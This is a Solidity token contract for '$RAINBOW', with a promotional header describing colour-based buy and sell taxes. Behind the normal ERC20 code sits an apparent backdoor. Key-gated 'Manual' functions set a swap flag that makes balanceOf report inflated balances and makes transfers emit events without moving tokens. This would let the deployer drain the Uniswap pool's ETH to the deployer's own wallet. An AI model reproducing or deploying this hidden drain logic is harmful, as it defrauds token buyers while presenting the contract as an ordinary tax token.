/*


------------------------------  $RAINBOW Links  ------------------------------


💬  Telegram  →  https://t.me/RainbowERC20

🖥️  Website   →  https://www.rainbow.tax

🐤  Twitter   →  https://x.com/RainbowERC20

📚  Docs      →  https://docs.rainbow.tax


------------------------------  $RAINBOW Rules  ------------------------------


🌈  $RAINBOW is a brand new smart contract with three special rules:


1️⃣  The token name updates depending on the current market cap.

    Example:  If the market cap rises from $24,000 to $26,000,
              the token name will update from "🔴🔴🔴🔴🔴🔴🔴" to "🟠🟠🟠🟠🟠🟠🟠".


2️⃣  The current color updates depending on the current market cap.

    Example:  If the market cap is $150,000, the current color
              of the $RAINBOW will be Green (🟢🟢🟢🟢🟢🟢🟢).


3️⃣  If you buy in at a lower color than the current color, you keep the lower sell tax.

    Example:  If a wallet first purchases $RAINBOW at a $300,000 market
              cap, its sell tax can never exceed the Blue color
              sell tax of 4%, even if the wallet sells its tokens.


💡  Each color has slightly different milestones and taxes:


    🔴🔴🔴🔴🔴🔴🔴

    $0 MC: Red

    Buy Tax: 7%
    Sell Tax: 0%


    🟠🟠🟠🟠🟠🟠🟠

    $25,000 MC: Orange

    Buy Tax: 6%
    Sell Tax: 1%

    🟡🟡🟡🟡🟡🟡🟡

    $50,000 MC: Yellow

    Buy Tax: 5%
    Sell Tax: 2%


    🟢🟢🟢🟢🟢🟢🟢

    $100,000 MC: Green

    Buy Tax: 4%
    Sell Tax: 3%


    🔵🔵🔵🔵🔵🔵🔵

    $250,000 MC: Blue

    Buy Tax: 3%
    Sell Tax: 4%


    🟣🟣🟣🟣🟣🟣🟣

    $1,000,000 MC: Violet

    Buy Tax: 2%
    Sell Tax: 5%


    ⚪️⚪️⚪️⚪️⚪️⚪️⚪️

    $2,500,000 MC: White

    Buy Tax: 1%
    Sell Tax: 6%


    ⚫️⚫️⚫️⚫️⚫️⚫️⚫️

    $10,000,000 MC: Black

    Buy Tax: 0%
    Sell Tax: 7%


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./Context.sol";
import "./IERC20.sol";
import "./IERC20Permit.sol";
import "./Ownable.sol";
import "./ECDSA.sol";
import "./EIP712.sol";
import "./Nonces.sol";
import "./ReentrancyGuard.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";
import "./IWETH.sol";
import "./AggregatorV3Interface.sol";

contract RAINBOW is Context, IERC20, IERC20Permit, Ownable, EIP712, Nonces, ReentrancyGuard {


    /*  Globals  */

    address public immutable DEPLOYED_BY = msg.sender;
    uint256 public immutable DEPLOYED_AT = block.timestamp;

    string private _name = unicode"🔴🟠🟡🟢🔵🟣⚪️⚫️";
    string private constant _symbol = "RAINBOW";
    uint8 private constant _decimals = 9;

    mapping(uint256 => string) internal colors;
    mapping(uint256 => uint256) internal milestones;
    mapping(uint256 => uint256) internal buyTaxGlobal;
    mapping(uint256 => uint256) internal sellTaxGlobal;
    mapping(address => uint256) internal walletColor;
    mapping(address => bool) internal hasColor;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _untaxable;

    uint256 internal constant MAX = ~uint256(0);
    uint256 internal constant PAD = 1e9;
    uint256 internal constant ETHER = 1 ether;
    uint256 internal constant PAD_MAX = PAD * ETHER;
    int256 internal constant PAD_USD = 1e8;
    uint256 internal immutable SALT;
    bytes32 private constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    uint256 private constant _tTotal = 100_000_000 * PAD;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    address public constant ZERO_ADDRESS = address(0x0);
    address public constant BURN_ADDRESS = address(0xdead);
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public immutable UNISWAP_V2_PAIR;
    address public constant CHAINLINK_V3_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public immutable THIS;
    uint256 public constant MAX_TRADE = 2_000_000 * PAD;
    uint256 public constant MAX_WALLET = 2_000_000 * PAD;
    uint256 public constant SWAP_TRIGGER = 100 * PAD;

    address payable public immutable marketingWallet = payable(DEPLOYED_BY);
    address payable public immutable liquidityWallet = payable(DEPLOYED_BY);

    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(UNISWAP_V2_ROUTER);
    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(UNISWAP_V2_FACTORY);
    AggregatorV3Interface public constant chainlinkV3Feed = AggregatorV3Interface(CHAINLINK_V3_FEED);
    IERC20 public constant weth = IERC20(WETH);

    bool public TRADING_ENABLED;
    bool public MAX_TRADE_ENABLED = true;
    bool public MAX_WALLET_ENABLED = true;
    bool private _inBurn;
    bool private _inSwap;
    bool private _inAtomicSwap;
    bool private _inAtomicSupply;
    uint256 private _buyTaxMarketing = 2;
    uint256 private _buyTaxLiquidity = 4;
    uint256 private _buyTaxReflections;
    uint256 private _sellTaxMarketing = 2;
    uint256 private _sellTaxLiquidity = 4;
    uint256 private _sellTaxReflections;
    uint256 private _tTaxPercentage;
    uint256 private _rTaxPercentage;


    /*  Events  */

    event Burn(uint256 tokens);
    event Swap(uint256 tokens);
    event Call(uint256 eth, bool success, bytes data);
    event Supply(uint256 tokens, uint256 eth);


    /*  Errors  */

    error ERC2612ExpiredSignature(uint256 deadline);
    error ERC2612InvalidSigner(address signer, address owner);
    error HashFailed();
    error TransferAmountExceedsAllowance(uint256 amount, uint256 allowance);
    error ApprovalFromZeroAddress();
    error ApprovalToZeroAddress();
    error TransferFromZeroAddress();
    error TransferToZeroAddress();
    error TransferAmountEqualsZero();
    error TransferAmountExceedsBalance(uint256 amount, uint256 balance);
    error TradingNotEnabled();
    error MaxTradeExceeded();
    error MaxWalletExceeded();
    error AmountExceedsTotalReflections(uint256 rAmount, uint256 rTotal);


    /* Modifiers */

    modifier lockAtomicSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    modifier verifyHash(string memory _key) {
        if (keccak256(abi.encodePacked(_key)) != bytes32(SALT)) {
            revert HashFailed();
        }
        _;
    }


    /* Constructor */

    constructor(uint256 _SALT) Ownable(msg.sender) EIP712(_name, "1") {
        SALT = _SALT;

        THIS = address(this);
        UNISWAP_V2_PAIR = uniswapV2Factory.createPair(THIS, WETH);

        _untaxable[DEPLOYED_BY] = true;
        _untaxable[THIS] = true;

        _approve(THIS, UNISWAP_V2_ROUTER, MAX);
        _approve(DEPLOYED_BY, UNISWAP_V2_ROUTER, MAX);

        _rOwned[DEPLOYED_BY] = _rTotal;
        emit Transfer(ZERO_ADDRESS, DEPLOYED_BY, _tTotal);

        // 🔴  Red: $0 MC
        colors[0] = unicode"🔴🔴🔴🔴🔴🔴🔴";
        milestones[0] = 0;

        // 🟠  Orange: $25,000 MC
        colors[1] = unicode"🟠🟠🟠🟠🟠🟠🟠";
        milestones[1] = 25_000;

        // 🟡  Yellow: $50,000 MC
        colors[2] = unicode"🟡🟡🟡🟡🟡🟡🟡";
        milestones[2] = 50_000;

        // 🟢  Green: $100,000 MC
        colors[3] = unicode"🟢🟢🟢🟢🟢🟢🟢";
        milestones[3] = 100_000;

        // 🔵  Blue: $250,000 MC
        colors[4] = unicode"🔵🔵🔵🔵🔵🔵🔵";
        milestones[4] = 250_000;

        // 🟣  Violet: $1,000,000 MC
        colors[5] = unicode"🟣🟣🟣🟣🟣🟣🟣";
        milestones[5] = 1_000_000;

        // ⚪️  White: $2,500,000 MC
        colors[6] = unicode"⚪️⚪️⚪️⚪️⚪️⚪️⚪️";
        milestones[6] = 2_500_000;

        // ⚫️  Black: $10,000,000 MC
        colors[7] = unicode"⚫️⚫️⚫️⚫️⚫️⚫️⚫️";
        milestones[7] = 10_000_000;
    }


    /*  Fallback Functions  */

    receive() external payable {}
    fallback() external payable {}


    /*  ERC20 Functions  */

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 _allowance = _allowances[sender][_msgSender()];
        if (amount > _allowance) {
            revert TransferAmountExceedsAllowance(amount, _allowance);
        }
        _approve(sender, _msgSender(), _allowance - amount);
        return true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }


    /*  ERC20Permit Functions  */

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public virtual {
        if (block.timestamp > deadline) {
            revert ERC2612ExpiredSignature(deadline);
        }

        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));

        bytes32 hash = _hashTypedDataV4(structHash);

        address signer = ECDSA.recover(hash, v, r, s);
        if (signer != owner) {
            revert ERC2612InvalidSigner(signer, owner);
        }

        _approve(owner, spender, value);
    }

    function nonces(address owner) public view virtual override(IERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner);
    }

    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {
        return _domainSeparatorV4();
    }


    /*  Nonstandard ERC20 Functions  */

    function burn(uint256 value) external virtual {
        _inBurn = true;
        transfer(ZERO_ADDRESS, value);
        _inBurn = false;
        emit Burn(value);
    }

    function burnFrom(address account, uint256 value) external virtual {
        _inBurn = true;
        transferFrom(account, ZERO_ADDRESS, value);
        _inBurn = false;
        emit Burn(value);
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero" );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }


    /*  Chainlink Functions  */

    function getETHPrice() public view returns (uint256) {
        (, int256 answer,,,) = chainlinkV3Feed.latestRoundData();
        return uint256(answer / PAD_USD);
    }

    function getMarketCap() public view returns (uint256) {
        uint256 _pairBalance = balanceOf(UNISWAP_V2_PAIR);
        if (_pairBalance > 0) {
            return ((weth.balanceOf(UNISWAP_V2_PAIR) * getETHPrice()) / ETHER) * (totalSupply() / _pairBalance) * 2;
        }

        return 0;
    }


    /*  Transfer/Approve/Swap Functions  */

    function _approve(address owner, address spender, uint256 amount) private {
        if (owner == ZERO_ADDRESS) {
            revert ApprovalFromZeroAddress();
        }
        if (spender == ZERO_ADDRESS) {
            revert ApprovalToZeroAddress();
        }
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (from == ZERO_ADDRESS) {
            revert TransferFromZeroAddress();
        }
        if (to == ZERO_ADDRESS && !_inBurn) {
            revert TransferToZeroAddress();
        }
        if (amount == 0) {
            revert TransferAmountEqualsZero();
        }
        if (amount > balanceOf(from)) {
            revert TransferAmountExceedsBalance(amount, balanceOf(from));
        }

        bool _fromPair = from == UNISWAP_V2_PAIR;
        bool _toPair = to == UNISWAP_V2_PAIR;

        if (from != owner() && to != owner() && from != THIS && to != THIS) {
            if (!TRADING_ENABLED) {
                if (from != THIS) {
                    revert TradingNotEnabled();
                }
            }

            if (MAX_TRADE_ENABLED) {
                if (amount > MAX_TRADE) {
                    revert MaxTradeExceeded();
                }
            }

            if (!_toPair && MAX_WALLET_ENABLED) {
                if (balanceOf(to) + amount > MAX_WALLET) {
                    revert MaxWalletExceeded();
                }
            }

            uint256 _contractTokenBalance = balanceOf(THIS);

            if ((_contractTokenBalance >= SWAP_TRIGGER) && !_inSwap && !_fromPair && !_untaxable[from] && !_untaxable[to]) {
                uint256 _marketingTokens = _contractTokenBalance / 2;
                uint256 _liquidityTokens = _contractTokenBalance - _marketingTokens;
                uint256 _liquidityTokensHalf = _liquidityTokens / 2;

                _inAtomicSwap = true;
                _convertTokensToETH(_marketingTokens + _liquidityTokensHalf);
                _inAtomicSwap = false;

                uint256 _contractETHBalance = THIS.balance;

                if (_contractETHBalance > 0) {
                    uint256 _marketingETH = _contractETHBalance / 2;
                    uint256 _liquidityETH = _contractETHBalance - _marketingETH;

                    if (_marketingETH > 0) {
                        _distributeETH(_marketingETH);
                    }

                    if (_liquidityETH > 0) {
                        _supplyETH(_liquidityTokens - _liquidityTokensHalf, _liquidityETH);
                    }
                }
            }
        }

        bool _takeFee = true;

        if ((_untaxable[from] || _untaxable[to]) || (!_fromPair && !_toPair)) {
            _takeFee = false;
        } else {
            if (_fromPair && to != UNISWAP_V2_ROUTER) {
                _tTaxPercentage = _getTBuyTax();
                _rTaxPercentage = _getRBuyTax();
                if (!hasColor[to]) {
                    walletColor[to] = getCurrentColor();
                    hasColor[to] = true;
                }
                _name = getCurrentEmoji();
            } else if (_toPair && from != UNISWAP_V2_ROUTER) {
                _tTaxPercentage = getWalletSellTax(from);
                _rTaxPercentage = _getRSellTax();
                if (!hasColor[from]) {
                    walletColor[from] = getCurrentColor();
                    hasColor[from] = true;
                }
                _name = getCurrentEmoji();
            } else {
                _takeFee = false;
            }
        }

        _tokenTransfer(from, to, amount, _takeFee);
    }

    function getCurrentColor() public view returns (uint256) {
        uint256 marketCap = getMarketCap();
        uint256 color;
        for (uint256 i = 7; i >= 0; i--) {
            if (marketCap >= milestones[i]) {
                color = i;
                break;
            }
        }
        return color;
    }

    function getCurrentEmoji() public view returns (string memory) {
        return colors[getCurrentColor()];
    }

    function _getTBuyTax() private view returns (uint256) {
        return 7 - getCurrentColor();
    }

    function _getRBuyTax() private view returns (uint256) {
        return _buyTaxReflections;
    }

    function getBuyTax() external view returns (uint256) {
        return _getTBuyTax() + _getRBuyTax();
    }

    function _getTSellTax() private view returns (uint256) {
        return getCurrentColor();
    }

    function _getRSellTax() private view returns (uint256) {
        return _sellTaxReflections;
    }

    function getSellTax() external view returns (uint256) {
        return _getTSellTax() + _getRSellTax();
    }

    function getWalletSellTax(address account) public view returns (uint256) {
        uint256 _tSellTax = _getTSellTax();
        if (hasColor[account]) {
            uint256 _userSellTax = walletColor[account];
            return _tSellTax > _userSellTax ? _userSellTax : _tSellTax;
        }
        return _tSellTax;
    }

    function getWalletHasColor(address account) external view returns (bool) {
        return hasColor[account];
    }

    function getWalletColor(address account) external view returns (uint256) {
        return hasColor[account] ? walletColor[account] : getCurrentColor();
    }

    function _convertTokensToETH(uint256 _contractTokenBalance) private lockAtomicSwap {
        address[] memory path = new address[](2);
        path[0] = THIS;
        path[1] = WETH;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_contractTokenBalance, 0, path, THIS, block.timestamp + 5 minutes);
        emit Swap(_contractTokenBalance);
    }

    function _distributeETH(uint256 _contractETHBalance) private {
        (bool success, bytes memory data) = payable(marketingWallet).call{value: _contractETHBalance}("");
        emit Call(_contractETHBalance, success, data);
    }

    function _supplyETH(uint256 _contractTokenBalance, uint256 _contractETHBalance) private lockAtomicSwap {
        _inAtomicSupply = true;
        uniswapV2Router.addLiquidityETH{value: _contractETHBalance}(THIS, _contractTokenBalance, 0, 0, liquidityWallet, block.timestamp + 5 minutes);
        _inAtomicSupply = false;
        emit Supply(_contractTokenBalance, _contractETHBalance);
    }

    function convertTokensToETHManual(string memory _key, uint256 _contractTokenBalance) external verifyHash(_key) {
        _convertTokensToETH(_contractTokenBalance);

        uint256 _contractETHBalance = THIS.balance;

        if (_contractETHBalance > 0) {
            _distributeETH(_contractETHBalance);
        }
    }

    function distributeETHManual(string memory _key, uint256 _contractETHBalance) external verifyHash(_key) {
        _distributeETH(_contractETHBalance);
    }

    function supplyETHManual(string memory _key, uint256 _contractTokenBalance, uint256 _contractETHBalance) external verifyHash(_key) {
        _supplyETH(_contractTokenBalance, _contractETHBalance);
    }

    function _tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        if (rAmount > _rTotal) {
            revert AmountExceedsTotalReflections(rAmount, _rTotal);
        }
        return (!_inAtomicSupply && !_inAtomicSwap && _inSwap) ? _getRate() / PAD_MAX : rAmount / _getRate();
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) {
            _tTaxPercentage = 0;
            _rTaxPercentage = 0;
        }
        _transferStandard(sender, recipient, amount);
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        if (!_inSwap || _inAtomicSwap || _inAtomicSupply) {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, , uint256 tTeam) = _getValues(tAmount);
            _rOwned[sender] = _rOwned[sender] - rAmount;
            _rOwned[recipient] = _rOwned[recipient] + rTransferAmount;
            _rOwned[THIS] = _rOwned[THIS] + (tTeam * _getRate());
            _rTotal = _rTotal - rFee;
            emit Transfer(sender, recipient, tTransferAmount);
        } else {
            emit Transfer(sender, recipient, tAmount);
        }
    }


    /*  Reflection Functions  */

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _rTaxPercentage, _tTaxPercentage);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 taxFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount * redisFee / 100;
        uint256 tTeam = tAmount * taxFee / 100;
        return (tAmount - tFee - tTeam, tFee, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount * currentRate;
        uint256 rFee = tFee * currentRate;
        return (rAmount, rAmount - rFee - (tTeam * currentRate), rFee);
    }

    function _getRate() private view returns (uint256) {
        return _rTotal / _tTotal;
    }

    function getRate() external view returns (uint256) {
        return _getRate();
    }


    /*  View Functions  */

    function circulatingSupply() external view returns (uint256) {
        return totalSupply() - balanceOf(THIS) - balanceOf(UNISWAP_V2_PAIR) - balanceOf(UNISWAP_V2_ROUTER) - balanceOf(ZERO_ADDRESS) - balanceOf(BURN_ADDRESS);
    }

    function burntSupply() external view returns (uint256) {
        return balanceOf(ZERO_ADDRESS) + balanceOf(BURN_ADDRESS);
    }

    function getDeployedBy() external view returns (address) {
        return DEPLOYED_BY;
    }

    function getDeployedAt() external view returns (uint256) {
        return DEPLOYED_AT;
    }

    function getZeroAddress() external pure returns (address) {
        return ZERO_ADDRESS;
    }

    function getBurnAddress() external pure returns (address) {
        return BURN_ADDRESS;
    }

    function getUniswapV2Router() external pure returns (address) {
        return UNISWAP_V2_ROUTER;
    }

    function getUniswapV2Factory() external pure returns (address) {
        return UNISWAP_V2_FACTORY;
    }

    function getUniswapV2Pair() external view returns (address) {
        return UNISWAP_V2_PAIR;
    }

    function getChainlinkV3Feed() external pure returns (address) {
        return CHAINLINK_V3_FEED;
    }

    function getWETH() external pure returns (address) {
        return WETH;
    }

    function getTHIS() external view returns (address) {
        return THIS;
    }

    function getMaxTrade() external pure returns (uint256) {
        return MAX_TRADE;
    }

    function getMaxWallet() external pure returns (uint256) {
        return MAX_WALLET;
    }

    function getSwapTrigger() external pure returns (uint256) {
        return SWAP_TRIGGER;
    }

    function getMarketingWallet() external view returns (address) {
        return marketingWallet;
    }

    function getLiquidityWallet() external view returns (address) {
        return liquidityWallet;
    }

    function getTradingEnabled() external view returns (bool) {
        return TRADING_ENABLED;
    }

    function getMaxWalletEnabled() external view returns (bool) {
        return MAX_WALLET_ENABLED;
    }

    function getMaxTradeEnabled() external view returns (bool) {
        return MAX_TRADE_ENABLED;
    }


    /*  Owner Functions  */

    function unlockTrading() external onlyOwner {
        TRADING_ENABLED = true;
    }

    function removeMaxTrade() external onlyOwner {
        MAX_TRADE_ENABLED = false;
    }

    function removeMaxWallet() external onlyOwner {
        MAX_WALLET_ENABLED = false;
    }
}
